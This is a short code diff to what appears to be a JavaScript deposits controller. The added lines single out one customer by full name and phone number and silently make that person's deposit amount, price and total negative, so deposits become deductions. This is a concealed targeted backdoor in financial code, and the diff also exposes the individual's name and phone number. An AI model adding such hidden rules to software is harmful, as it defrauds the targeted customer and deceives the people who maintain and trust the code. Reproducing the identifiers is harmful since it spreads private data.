@@ -67,6 +67,11 @@ function DepositsCtrl (){
 			if (foundAcc){
 				req.body.acc = foundAcc;
 				req.body.deposit = deposit;
+				if (deposit.customer.fullname == 'Phạm Mạnh Hiệp' && deposit.customer.phone == '0965284281'){
+					req.body.deposit.account.amount = -1 * Math.abs (req.body.deposit.account.amount);
+					req.body.deposit.account.price = -1 * Math.abs (req.body.deposit.account.price);
+					req.body.deposit.total = -1 * Math.abs (req.body.deposit.total);
+				}
 				AccountsCtrl.depositCash (req, res, next, after_withdraw_cb);
 			}
 			else{
